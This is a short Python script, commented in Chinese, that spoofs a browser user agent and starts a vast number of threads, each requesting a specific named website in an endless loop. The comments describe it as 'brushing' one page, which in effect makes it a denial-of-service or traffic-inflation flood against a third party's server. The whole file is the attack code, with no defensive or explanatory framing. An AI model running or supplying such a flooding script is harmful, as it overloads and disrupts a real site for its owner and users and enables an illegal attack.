import urllib.request
import time
 
# 使用build_opener()是为了让python程序模仿浏览器进行访问
opener = urllib.request.build_opener()
opener.addheaders = [('User-agent', 'Mozilla/5.0')]
 
 
# 专刷某个页面
print('开始刷了哦：')
tempUrl = 'http://www.lcyzczb.com//'
 
 
a = 0
def main():
    global a
    while True:
        try:
            opener.open(tempUrl)
        
            print('%d %s' % (a, tempUrl))
            a = a + 1
        except urllib.error.HTTPError:
            print('urllib.error.HTTPError')
            time.sleep(1)
        except urllib.error.URLError:
            print('urllib.error.URLError')
            time.sleep(1)

import threading
for i in range(1,200000000000):
    threading._start_new_thread(main,())

main()